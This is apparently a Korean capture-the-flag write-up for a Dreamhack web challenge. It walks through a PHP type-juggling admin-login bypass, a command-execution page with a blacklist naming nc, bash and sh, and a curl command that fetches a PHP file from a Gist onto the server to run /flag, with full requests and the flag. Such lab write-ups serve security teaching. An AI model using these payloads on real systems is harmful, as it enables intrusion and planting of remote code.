# S4 · Switching Command

### 1. VM에 접속한다

문제 페이지에는 사용자명을 입력하는 폼이 있다. 입력값은 `index.php`에서 JSON으로 파싱되며, 인증 후 `test.php`로 이동한다.

### 2. 코드 분석 — PHP Type Juggling으로 관리자 인증 우회

**① `index.php`의 비교 방식이 다르다.**

```php
$data = json_decode($_POST["username"]);
$username = $data->username;

if ($username === "admin") {
    exit("no hack");
}

switch ($username) {
    case "admin":
        $user = "admin";
        $password = "***REDACTED***";
        // 고정된 계정 정보로 DB 조회 후 결과가 1건이면
        // $_SESSION["auth"] = "admin";
        // header("Location: test.php");
        break;
    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
```

- `===`는 **값과 자료형을 모두 비교**하므로, Boolean `true`는 문자열 `"admin"`과 일치하지 않는다.
- 반면 `switch`의 `case` 비교는 **느슨한 비교(`==`)**를 사용한다. PHP 8에서 `true == "admin"`은 참이므로 관리자 분기에 진입할 수 있다.
- 해당 분기는 사용자가 보낸 값을 DB 비밀번호로 쓰지 않고, 코드에 고정된 관리자 계정 정보로 조회한다. `deploy/mysql_init/init.sql`에도 `admin` 계정이 등록되어 있다.

**② JSON Boolean `true`를 보낸다.**

```json
{"username":true}
```

Burp Suite Repeater에서 보낸 POST 요청:

```http
POST /index.php HTTP/1.1
Host: host3.dreamhack.games:21271
Content-Type: application/x-www-form-urlencoded

username=%7B%22username%22%3Atrue%7D
```

`%7B%22username%22%3Atrue%7D`는 `{"username":true}`를 URL 인코딩한 값이다.

```text
true === "admin" → false (차단 조건 통과)
switch(true) → case "admin" 일치
DB 조회 결과 1건 → $_SESSION["auth"] = "admin"
```

응답에서 `302 Found`, `Location: test.php`, `PHPSESSID`를 확인하고 이후 요청에 같은 세션 쿠키를 사용한다. **302 자체는 관리자 인증의 증거가 아니다.** Guest 분기도 같은 경로로 리다이렉트하기 때문에, 이후 관리자 전용 명령 실행 동작으로 권한을 확인한다.

### 3. 코드 분석 — `test.php`의 명령 실행

관리자 세션일 때 `cmd` 파라미터를 서버 명령으로 실행한다.

```php
include("./config.php");
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if ($_SESSION["auth"] === "admin") {
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n", "", $command);
    if (preg_match($pattern, $sanitized_command)) {
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
```

- `config.php`의 `session_start()`가 세션을 유지한다.
- `preg_match()`는 `flag`, `bash`, `sh` 등의 단어를 차단하고, `escapeshellcmd()`는 일부 셸 특수문자를 이스케이프한다.
- 하지만 `shell_exec()`에는 여전히 사용자가 지정한 명령이 전달되므로, 허용된 명령은 서버에서 실행된다.

**실행 결과가 보이지 않는 이유**도 코드에 있다.

```php
$resulttt = shell_exec(...);  // 실제 실행 결과 저장
echo "<pre>$result</pre>";   // HTML에서 다른 변수를 출력
```

관리자 분기는 `$resulttt`에 저장하지만 화면에서는 `$result`를 출력해, 실행된 명령의 출력이 보이지 않는다.

### 4. Gist에서 `run.php` 가져오기

`/flag`를 직접 `cmd`에 입력하면 `flag` 단어가 블랙리스트에 걸린다. 그래서 외부 PHP 파일에 실행 코드를 넣고 이를 서버로 내려받는 방식을 사용했다.

**Gist의 `run.php` 내용**

```php
<?php
passthru('/flag');
?>
```

`passthru()`는 프로그램을 실행하고 그 출력을 직접 응답에 전달한다. 문제의 `Dockerfile`을 보면 `/flag`는 텍스트 파일이 아니라 `flag.c`를 컴파일한 실행 파일이다.

```dockerfile
COPY ./flag.c /flag.c
RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c
```

관리자 세션을 유지한 상태에서 Burp Repeater로 다음 요청을 보낸다.

```http
GET /test.php?cmd=curl%20-fsSL%20https%3A%2F%2Fgist.githubusercontent.com%2Fmyhtml1231-star%2F1782817ec026490b75c425a742f53c8a%2Fraw%2Fd465571a999d0c87a875fc83cbb8f550da074923%2Frun.php%20-o%20run.php HTTP/1.1
Host: host3.dreamhack.games:21271
Cookie: PHPSESSID=<관리자_세션_ID>
```

실제로 실행하도록 전달한 명령은 다음과 같다.

```bash
curl -fsSL https://gist.githubusercontent.com/myhtml1231-star/1782817ec026490b75c425a742f53c8a/raw/d465571a999d0c87a875fc83cbb8f550da074923/run.php -o run.php
```

`curl -fsSL`로 Gist 원본을 가져와 `-o run.php`로 저장한다. `cmd`에는 `flag`라는 문자열이 없으므로 `test.php`의 블랙리스트가 PHP 파일 내부의 `passthru('/flag')`를 검사하지 않는다. 다운로드 후 화면에 별다른 출력이 없어도, 앞서 확인한 변수명 불일치 때문에 그럴 수 있다.

### 5. `run.php` 실행 후 FLAG 확인

서버의 웹 디렉터리에 저장된 `run.php`에 직접 접근한다.

```http
GET /run.php HTTP/1.1
Host: host3.dreamhack.games:21271
```

```text
GET /run.php
    ↓
PHP가 run.php 실행
    ↓
passthru('/flag')
    ↓
/flag 실행 파일의 표준 출력이 HTTP 응답에 표시
```

**확인한 FLAG**

```text
DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}
```

> **취약점 원인:** `index.php`에서 엄격 비교(`===`)와 느슨한 `switch` 비교를 혼용하여 관리자 인증을 우회할 수 있었다. 이어 `test.php`가 관리자에게 허용한 OS 명령 실행 기능과 단순 블랙리스트를 이용해 별도 PHP 파일을 실행했다.
